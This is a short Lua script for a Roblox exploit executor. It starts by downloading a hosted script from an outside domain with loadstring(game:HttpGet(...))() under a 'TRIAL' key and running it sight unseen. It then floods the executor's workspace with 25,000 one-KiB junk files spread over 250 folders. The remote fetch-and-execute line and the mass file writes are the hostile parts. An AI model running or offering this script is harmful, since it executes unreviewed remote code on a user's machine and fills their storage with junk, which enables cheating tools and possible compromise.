script_key = "TRIAL"
 
loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/f796a7505e92a0c6a1c4f3e489bf460b64a16ea13779bb6149f88c38909e29c1.lua"))()
task.wait(5)
local folderPrefix = "Systematic"
local totalFiles = 25000
local filesPerFolder = 100
local foldersPerBatch = 20
local filesPerFolderPerBatch = 20
local waitTime = 0.15
local fileSize = 1024 -- 1 KiB per file

local content = string.rep("A", fileSize)

local totalFolders = math.ceil(totalFiles / filesPerFolder)

for batchStart = 1, totalFolders, foldersPerBatch do
    local batchEnd = math.min(batchStart + foldersPerBatch - 1, totalFolders)

    for folderIndex = batchStart, batchEnd do
        local folderName = folderPrefix .. folderIndex

        if not isfolder(folderName) then
            makefolder(folderName)
        end

        local firstFile = 1
        local lastFile = math.min(filesPerFolderPerBatch, totalFiles - (folderIndex - 1) * filesPerFolder)

        for fileIndex = firstFile, lastFile do
            local fileName = folderName .. "/File" .. fileIndex .. ".txt"

            local success, err = pcall(function()
                writefile(fileName, content)
            end)

            if success then
                print("Created: " .. fileName)
            else
                warn("Failed: " .. fileName .. " - " .. tostring(err))
            end
        end
    end

    task.wait(waitTime)
end
